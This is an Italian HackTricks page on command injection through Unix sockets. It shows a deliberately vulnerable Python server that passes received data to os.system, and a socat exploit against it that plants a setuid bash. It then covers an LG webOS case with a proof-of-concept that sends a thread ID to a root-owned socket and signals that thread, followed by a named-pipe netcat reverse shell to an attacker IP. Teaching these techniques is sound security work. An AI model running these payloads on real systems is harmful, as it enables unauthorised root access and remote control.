# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Esempio di socket binding con Python

Nell'esempio seguente viene creato un **unix socket** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** sarà **eseguito** da `os.system`. So che non lo troverai nel mondo reale, ma l'obiettivo di questo esempio è vedere com'è un codice che usa unix sockets e come gestire l'input nel peggior caso possibile.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Esegui** il codice usando python: `python s.py` e **verifica come il socket è in ascolto**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Caso di studio: escalation tramite signal su UNIX socket di proprietà root (LG webOS)

Alcuni daemons privilegiati espongono un root-owned UNIX socket che accetta input non attendibile e associa azioni privilegiate a thread-IDs e signals. Se il protocollo permette a un client non privilegiato di influenzare quale native thread venga preso di mira, potresti riuscire a innescare un percorso di codice privilegiato e escalation.

Pattern osservato:
- Connettersi a un socket di proprietà root (es., /tmp/remotelogger).
- Creare un thread e ottenere il suo native thread id (TID).
- Inviare il TID (packed) più padding come richiesta; ricevere un acknowledgement.
- Inviare un signal specifico a quel TID per attivare il comportamento privilegiato.

Bozza di PoC minimale:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Per trasformarlo in una shell root, può essere usato un semplice pattern named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Note:
- Questa classe di bug nasce dal fidarsi di valori derivati dallo stato client non privilegiato (TIDs) e dal legarli a gestori di segnali o a logica privilegiata.
- Indurire imponendo credenziali sul socket, validando i formati dei messaggi e disaccoppiando le operazioni privilegiate dagli identificatori di thread forniti esternamente.

## Riferimenti

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
